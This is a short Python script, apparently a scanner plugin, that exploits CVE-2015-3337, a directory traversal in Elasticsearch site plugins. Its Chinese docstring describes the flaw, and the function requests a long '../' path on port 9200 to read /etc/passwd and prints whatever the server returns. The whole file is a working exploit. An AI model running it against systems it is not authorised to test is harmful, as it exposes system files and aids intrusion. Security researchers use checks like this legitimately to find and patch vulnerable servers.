#!/usr/bin/env python
# coding: utf-8
# Date  : 2018-07-12 21:18:41
# Author: b4zinga
# Email : b4zinga@outlook.com
# Func  :

import requests

def run(url):
    """Version: < 1.4.5  or < 1.5.2
    在安装了具有“site”功能的插件以后,插件目录使用../即可向上跳转,导致目录穿越漏洞,可读取任意文件
    CVE-2015-3337"""
    req = requests.get(url+':9200/_plugin/head/../../../../../../../../../etc/passwd', timeout=5)
    if req.status_code == 200:
        print(req.text)
        return 'ElasticSearch Directory traversal ~ '
    else:
        return False